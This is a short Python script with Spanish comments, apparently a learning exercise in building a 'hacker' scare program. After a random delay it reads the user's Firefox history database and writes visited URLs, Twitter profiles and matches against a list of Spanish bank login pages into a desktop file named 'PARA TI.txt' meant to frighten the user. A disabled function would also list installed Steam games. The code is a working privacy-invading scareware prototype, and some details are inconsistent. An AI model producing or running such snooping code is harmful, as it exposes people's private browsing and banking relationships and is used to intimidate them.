import os
from time import sleep
import random
import sqlite3
import re

HACKER_FILE_NAME = "PARA TI.txt"

def delay_action():
    n_minutes = random.randrange(30, 60)
    print("Durmiendo {} minutos".format(n_minutes))
    sleep(n_minutes * 180)

def create_hacker_file(user_path):
    with open(user_path + "/Escritorio/" + HACKER_FILE_NAME,"w") as hacker_file:
        hacker_file.write("<3")

def get_firefox_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/.mozilla/firefox/92r8292o.default-release/places.sqlite"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            select_statement = "select moz_places.url, moz_places.visit_count from moz_places;"
            cursor.execute(select_statement)
            results = cursor.fetchall()
            connection.close()
            return results
        except sqlite3.OperationalError as e:
            sleep(3)

def check_history_and_scare_user(user_path , hacker_file, firefox_history):
    for item in firefox_history[:100]:
        with open(user_path + "/Escritorio/" + HACKER_FILE_NAME,"a") as hacker_file:
            hacker_file.write("Visitaste {}\n".format(item[0]))
            results = re.findall("https://twitter.com/[A-Za-z0-9]+$", item[0])
            if results:
                with open(user_path + "/Escritorio/" + HACKER_FILE_NAME,"a") as hacker_file:
                    hacker_file.write("TW {}\n".format(item[0]))

def check_bank_account(user_path , hacker_file, firefox_history):
    bank_links = ["https://particulares.bancosantander.es/login/","https://www.bbva.es/personas.html","https://www.caixabank.es/particular/home/particulares_es.html","https://bancaelectronica.abanca.com/","https://www.ruralvia.com/isum/Main?ISUM_SCR=login&loginType=accesoSeguro&ISUM_Portal=2&acceso_idioma=es_ES"]
    for item in firefox_history:
        for a in range(len(bank_links)):
            if item[0] == bank_links[a]:
                with open(user_path + "/Escritorio/" + HACKER_FILE_NAME,"a") as hacker_file:
                    hacker_file.write("BA {}\n".format(item[0]))
            else:
                a+=1

def check_steam_games(user_path, hacker_file):
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common"
    games = os.listdir(steam_path)
    with open(user_path + "/Escritorio/" + HACKER_FILE_NAME,"a") as hacker_file:
                    hacker_file.write("GAME:  {}\n".format(games))

def main():
    #Esperamos entre 1h y 3h
    delay_action()
    #Calculamos la ruta del usuario de linux
    user_path = "/home/"+os.getlogin()
    #Creamos el archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    #Recogemos su historial de firefox
    firefox_history = get_firefox_history(user_path)
    #Escribimos mensajes de miedo
    check_history_and_scare_user(user_path, hacker_file, firefox_history)
    #Miramos en que bancos tiene una cuenta abierta.
    check_bank_account(user_path , hacker_file, firefox_history)
    #Miramos que juegos tiene instalados en steam.
    #check_steam_games(user_path, hacker_file)

if __name__ == "__main__":
    main()
